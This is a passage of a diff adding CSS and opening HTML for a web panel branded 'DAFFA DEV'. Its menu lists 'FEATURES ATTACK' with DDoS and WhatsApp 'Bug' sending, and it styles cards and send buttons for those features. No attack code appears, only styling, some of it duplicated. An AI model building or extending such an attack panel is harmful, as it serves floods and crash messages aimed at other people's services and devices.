+
+.card::after{display:none;}
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+}
+
+.card i {
+  margin-right: 8px;
+  font-size: 1.2rem;
+  color: #28c76f;
+}
+
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  text-shadow: none;
+}
+
+.card i {
+  margin-right: 15px;
+  font-size: 1.5rem;
+  color: #28c76f;
+}
+
+
+.bug-menu {
+  display: grid;
+  gap: 14px;
+  max-width: 420px;          /* biar gak melebar */
+  margin: 0 auto;            /* center di container */
+}
+
+.bug-card {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  padding: 16px 18px;
+  border-radius: 18px;
+  background: linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,.01));
+  border: 1px solid rgba(255,255,255,.08);
+  cursor: pointer;
+  transform: translateY(18px);
+  opacity: 0;
+  filter: blur(6px);
+  transition: all .7s ease;
+}
+
+.bug-card i {
+  font-size: 24px;
+  color: var(--primary);
+  flex-shrink: 0;
+}
+
+.bug-card h4 {
+  margin: 0;
+  font-size: 16px;
+  font-weight: 600;
+}
+
+.bug-card p {
+  margin: 2px 0 0;
+  font-size: 13px;
+  color: var(--muted);
+}
+
+/* Hover effect */
+.bug-card:hover {
+  background: linear-gradient(90deg, rgba(40,199,111,.08), rgba(40,199,111,.04));
+  transform: translateY(-4px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.3);
+}
+
+/* Animation reveal per item */
+.bug-card.visible {
+  opacity: 1;
+  transform: translateY(0);
+  filter: blur(0);
+}
+
+.bug-card.selected {
+  border-color: var(--primary);
+  background: linear-gradient(90deg, rgba(155,92,255,.16), rgba(0,212,255,.12));
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+}
+
+.status-card {
+  width: 100%;
+  max-width: 300px;  /* biar ukuran pas */
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  border-radius: 16px;
+  background: rgba(255,255,255,0.06);
+  border: 1px solid rgba(255,255,255,0.12);
+  backdrop-filter: blur(8px);
+  color: white;
+  text-align: center;
+  transition: transform 0.3s ease;
+}
+
+.status-card:hover {
+  transform: translateY(-4px);
+}
+
+.status-card i {
+  font-size: 42px;
+  margin-bottom: 8px;
+  color: var(--primary);
+}
+
+.status-card span {
+  font-weight: 600;
+  font-size: 18px;
+}
+
+.status-card p {
+  margin: 6px 0 0;
+  font-size: 15px;
+  color: var(--muted);
+}
+.status-row {
+  display: grid;
+  grid-template-columns: 1fr 1fr; /* dua kolom sama besar */
+  gap: 20px;
+  width: 100%;
+  max-width: 600px;
+  margin-top: 20px;
+  align-items: stretch;          /* ✅ samakan tinggi */
+}
+
+.status-row 
+
+.card {
+  width: 100%;
+  max-width: 400px;
+  padding: 20px;
+  margin: 15px auto;
+  border-radius: 15px;
+  background-color: #111927;
+  color: #e6e6e6;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1rem;
+  text-align: left;   /* biar teks tetap rata kiri */
+  cursor: pointer;
+  transition: all 0.3s ease;
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  border: 1px solid rgba(0, 255, 162, 0.2);
+  position: relative;
+  overflow: hidden;
+  display: block;     /* jangan pakai flex center */
+}
+
+.card::after{display:none;}
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+}
+
+.card i {
+  margin-right: 8px;
+  font-size: 1.2rem;
+  color: #28c76f;
+}
+
+
+@keyframes cyberscan {
+  0% {
+    transform: translateX(-100%);
+  }
+  100% {
+    transform: translateX(100%);
+  }
+}
+
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+  text-shadow: none;
+}
+
+.card i {
+  margin-right: 15px;
+  font-size: 1.5rem;
+  color: #28c76f;
+}
+
+#sendBugBtn {
+  width: 100%;                  /* penuh */
+  max-width: 600px;             /* sejajar dengan card Bug */
+  background: rgba(255, 255, 255, 0.06);
+  border: 1px solid rgba(255, 255, 255, 0.12);
+  backdrop-filter: blur(10px);
+  border-radius: 18px;
+  padding: 16px;
+  font-size: 16px;
+  font-weight: 600;
+  color: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  margin: 0 auto;               /* center */
+}
+
+#sendBugBtn:hover {
+  transform: translateY(-4px);
+  box-shadow: 0 8px 24px rgba(0,0,0,0.35);
+}
+/* BOTTOM NAV */
+.bottom-nav {
+  position: fixed;
+  bottom: 0; left: 0; right: 0;
+  height: 64px;
+  background: linear-gradient(90deg, rgba(16,22,40,.98), rgba(10,12,18,.98));
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  backdrop-filter: blur(10px);
+  border-top: 1px solid rgba(255,255,255,.04);
+  z-index: 80;
+
+  transform: translateY(100%);
+  opacity: 0;
+  transition: transform .6s cubic-bezier(.2,.9,.25,1), opacity .45s ease;
+}
+
+/* visible */
+.bottom-nav.show {
+  transform: translateY(0);
+  opacity: 1;
+}
+
+/* each item : icon only by default */
+.bottom-nav a {
+  flex: 1;
+  text-align: center;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 12px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 6px;
+  padding: 8px 6px;
+  transition: color .3s ease, transform .35s ease;
+}
+
+/* icon size */
+.bottom-nav a i { font-size: 20px; line-height:1; }
+
+/* label hidden by default */
+.bottom-nav a span {
+  display: block;
+  font-size: 12px;
+  max-height: 0;
+  opacity: 0;
+  transform: translateY(6px);
+  overflow: hidden;
+  transition: max-height .6s cubic-bezier(.2,.9,.25,1), opacity .45s ease, transform .45s cubic-bezier(.2,.9,.25,1);
+}
+
+/* when active: show text, highlight color, and lift slightly */
+.bottom-nav a.active {
+  color: var(--primary);
+  transform: translateY(-4px);
+}
+
+.bottom-nav a.active span {
+  max-height: 28px; /* cukup tinggi untuk 1 baris teks */
+  opacity: 1;
+  transform: translateY(0);
+}
+
+/* hide admin item if needed (we'll toggle via JS) */
+.bottom-nav a.hidden { display: none !important; }
+
+/* small screens: make icons a bit bigger/space */
+@media (max-width:420px){
+  .bottom-nav a i { font-size:22px; }
+  .bottom-nav { height:70px; }
+}
+main[id^="view-"] {
+  opacity: 0;
+  transform: translateY(30px); /* turun lebih jauh biar lebih dramatis */
+  transition: opacity 1.2s ease, transform 1.2s ease;
+}
+
+
+/* PROFILE CARD */
+.profile-card {
+  position: fixed;
+  inset: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: rgba(10, 15, 30, 0.6);
+  backdrop-filter: blur(8px);
+  z-index: 100;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity .4s ease;
+}
+.profile-card.show {
+  opacity: 1;
+  pointer-events: auto;
+}
+.profile-card .card-glass {
+  background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
+  border: 1px solid rgba(255,255,255,.1);
+  border-radius: 20px;
+  padding: 24px;
+  width: 320px;
+  color: var(--text);
+  transform: translateY(40px);
+  transition: transform .4s ease, opacity .4s ease;
+  opacity: 0;
+  position: relative;
+}
+.profile-card.show .card-glass {
+  transform: translateY(0);
+  opacity: 1;
+}
+.profile-card .close-btn {
+  background: transparent;
+  border: none;
+  font-size: 22px;
+  color: var(--text);
+  position: absolute;
+  top: 18px; right: 22px;
+  cursor: pointer;
+  transition: transform .2s;
+}
+.profile-card .close-btn:hover { transform: scale(1.2); }
+
+main[id^="view-"].visible {
+  opacity: 1;
+  transform: translateY(0);
+}
+@keyframes successFlash {
+  0%   { background: rgba(0, 255, 0, 0.15); }
+  50%  { background: rgba(0, 255, 0, 0.25); }
+  100% { background: transparent; }
+}
+
+.card.success-anim {
+  animation: successFlash 1.5s ease;
+}
+.notif-popup {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%) scale(0.9);
+  background: rgba(30, 30, 30, 0.5); /* lebih gelap, mirip card Server */
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  backdrop-filter: blur(12px);
+  padding: 22px 36px;   /* agak lebar dan tinggi */
+  border-radius: 18px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  color: white;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity 0.18s ease, transform 0.18s ease; /* muncul cepat */
+  z-index: 9999;
+  min-width: 320px;   /* ✅ biar lebar seperti banner */
+  max-width: 80%;
+  text-align: center;
+  justify-content: center;
+}
+
+.notif-popup i {
+  font-size: 22px;
+}
+
+.notif-popup.show {
+  opacity: 1;
+  transform: translate(-50%, -50%) scale(1);
+  pointer-events: auto;
+}
+/* 2 kiri 2 kanan */
+.ddos-grid {
+  display:grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap:14px;
+  margin:0 auto;
+  max-width:600px;
+}
+
+/* 2 kiri 2 kanan */
+.ddos-grid {
+  display:grid;
+  grid-template-columns: repeat(2, 1fr);
+  gap:14px;
+  margin:0 auto;
+  max-width:600px;
+}
+
+/* ddos card */
+.ddos-card {
+  display:flex;
+  gap:12px;
+  align-items:center;
+  padding:16px;
+  border-radius:14px;
+  background: linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,.01));
+  border:1px solid rgba(255,255,255,.06);
+  cursor:pointer;
+  transition:all .16s ease;
+}
+.ddos-card i { font-size:30px; color:var(--primary); flex-shrink:0; }
+.ddos-card.selected {
+  border-color: rgba(155,92,255,.28);
+  background: linear-gradient(90deg, rgba(155,92,255,.12), rgba(0,212,255,.08));
+  transform:translateY(-4px);
+  box-shadow: 0 8px 20px rgba(0,0,0,.45);
+}
+
+/* ===== perbaikan teks judul & deskripsi ===== */
+.ddos-card > div {
+  display: flex;
+  flex-direction: column;
+  gap: 4px; /* jarak kecil antar teks */
+}
+
+.ddos-card h4 {
+  margin: 0;
+  font-size: 15px;
+  line-height: 1.2;
+}
+
+.ddos-card p {
+  margin: 0;
+  font-size: 13px;
+  color: var(--muted);
+  line-height: 1.2;
+}
+
+/* glass button */
+.glass-btn {
+  background: linear-gradient(90deg, rgba(255,255,255,.02), rgba(255,255,255,.01));
+  border: 1px solid rgba(255,255,255,.08);
+  backdrop-filter: blur(6px);
+  padding:10px 16px;
+  border-radius:14px;
+  font-weight:700;
+  cursor:pointer;
+  transition:transform .12s, box-shadow .12s;
+}
+.glass-btn:hover { transform:translateY(-3px); box-shadow:0 8px 20px rgba(0,0,0,.14); }
+
+/* status cards */
+.status-card-lg {
+  flex:1;
+  min-width:220px;
+  min-height:120px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  border-radius:14px;
+  background: linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.02));
+  border:1px solid rgba(255,255,255,.08);
+  box-shadow:0 10px 24px rgba(0,0,0,.12);
+  text-align:center;
+}
+.ddos-send-box {
+  margin: 18px 0;
+  padding: 18px;
+  border-radius: 14px;
+  text-align: center;
+  background: rgba(255, 255, 255, 0.08);
+  border: 1px solid rgba(255, 255, 255, 0.15);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+}
+
+.msg-wrap {
+  margin-top: 10px;
+  text-align: center; /* supaya bubble tetap center */
+}
+
+.msg-glass {
+  display: inline-block; /* biar bubble rapat */
+  padding: 6px 14px;
+  border-radius: 10px;
+  background: rgba(255, 255, 255, 0.1);
+  border: 1px solid rgba(255, 255, 255, 0.18);
+  backdrop-filter: blur(8px);
+  -webkit-backdrop-filter: blur(8px);
+  font-weight: 600;
+  font-size: 14px;
+  color: #fff;
+}
+.slideshow-box {
+  width: 100%;
+  max-width: 320px;
+  height: 190px;
+  margin: 16px auto 0 auto; /* tetap center */
+  position: relative;
+  overflow: hidden;
+  border-radius: 16px;
+  border: 2px solid rgba(255,255,255,.2);
+}
+
+.slide-box {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  left: 100%;
+  top: 0;
+  transition: left 1s ease;
+}
+
+.slide-box img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  border-radius: 16px;
+}
+
+.slide-box .slide-text {
+  position: absolute;
+  bottom: 10px;
+  left: 12px;
+  font-size: 22px;
+  font-weight: 800;
+
+  /* Isi putih */
+  color: white;
+
+  /* Outline hitam */
+  
+}
+
+.slide-box.active {
+  left: 0;
+  z-index: 2;
+}
+
+.slide-box.prev {
+  left: -100%;
+  z-index: 1;
+}
+.status-card-lg i { font-size:40px; color:var(--primary); }
+  
+/* Sliding top line for every card (only top) */
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  height: 3px; /* thickness of the line */
+  width: 100%;
+  pointer-events: none;
+  background: linear-gradient(90deg, transparent, rgba(40,199,111,0.95), transparent);
+  animation: slideTop 1.8s linear infinite;
+  z-index: 5;
+  opacity: 0.98;
+  border-top-left-radius: 12px;
+  border-top-right-radius: 12px;
+  border-bottom-left-radius: 0;
+  border-bottom-right-radius: 0;
+  box-shadow: none;
+}
+
+/* ensure the cards are positioned relative for the pseudo element */
+.card { position: relative; overflow: hidden; }
+
+/* animation */
+@keyframes slideTop {
+  0% { left: -100%; }
+  50% { left: 0%; }
+  100% { left: 100%; }
+}
+ .hero-desc {
+    font-family: "Orbitron", sans-serif;
+    color: var(--text);
+    line-height: 1.7;
+    max-width: 480px;
+    font-weight: 400;
+    font-size: 15px;
+    letter-spacing: 0.5px; /* tambah kesan techno */
+  }
+
+/* make bug page width same as ddos */
+#view-bug { display:flex; justify-content:center; }
+#view-bug .card { max-width:760px; width:100%; margin:22px auto; }
+</style>
+</head>
+<body>
+  <!-- Nav -->
+<header class="nav">
+  <div class="brand">
+     <i class="fas fa-user-secret"></i> <h1>DAFFA DEV</h1>
+  </div>
+  <div id="userBadge" class="chip hidden">
+    <i class="fas fa-user"></i><span id="who"></span>
+  </div>
+  <div class="flex" style="gap:12px;">
+    <button id="btnProfile" class="hamburger hidden">
+      <i class="fa-solid fa-user-circle"></i>
+    </button>
+    <button id="btnHamburger" class="hamburger hidden" aria-label="Menu">
+      <i class="fa-solid fa-bars"></i>
+    </button>
+  </div>
+</header>
+
+<!-- Drawer -->
+<aside id="drawer" class="drawer">
+  <nav class="menu">
+    <h4>Dashboard</h4>
+    <a href="#" data-view="dashboard" class="active"><i class="fa-solid fa-home"></i> Home</a>
+        <h4>FEATURES ATTACK</h4>
+    <a href="#" data-view="ddos"><i class="fa-solid fa-bolt"></i> DDOS</a>
+    <a href="#" data-view="bug"><i class="fab fa-whatsapp"></i>  Bug</a>
+    <div id="adminSection" class="hidden">
+      <h4>MANAGE</h4>
+      <a href="#" data-view="accounts"><i class="fa-solid fa-user-gear"></i> Manage Account</a>
+      
+    </div>
+  </nav>
+</aside>  <!-- LOGIN -->  <main id="view-login" class="hero">
+    <div class="glow"></div>
+    <section class="login">
+      <div class="illus reveal left">
+        <!-- GIF di atas, center -->
+<div style="display:flex; justify-content:center; margin-bottom:15px;">
+  <img src="coding.gif" alt="Live Wallpaper" style="width:220px; max-width:100%; height:auto;">
+</div>
+
+<!-- Badge + Judul + Deskripsi + Tombol -->
 <span class="badge"><i class="fa-solid fa-bug"></i> BUG</span>
 <h2 style="margin-top:6px; margin-bottom:10px;">
   APPLICATION <span style="background:linear-gradient(90deg,var(--primary),var(--secondary));
